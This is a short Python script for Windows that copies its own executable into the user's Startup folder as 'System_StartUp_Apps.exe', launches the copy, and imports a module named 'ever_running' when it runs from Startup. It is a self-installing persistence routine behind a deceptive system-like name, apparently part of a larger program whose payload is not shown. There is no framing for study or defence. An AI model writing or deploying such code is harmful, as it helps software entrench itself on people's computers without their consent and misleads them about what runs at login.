from os import path, system
from winshell import startup
from sys import argv
from shutil import copy2

startup_path = startup()
file = path.abspath(argv[0])
local = path.dirname(file)
dst = path.join(startup_path, "System_StartUp_Apps.exe")

if path.normcase(path.normpath(local)) == path.normcase(path.normpath(startup_path)):
    import ever_running

else:
    exist = path.exists(dst)
    if exist == True:
        pass
    else:
        copy2(file, dst)
        system(f"start \"\" \"{dst}\"")
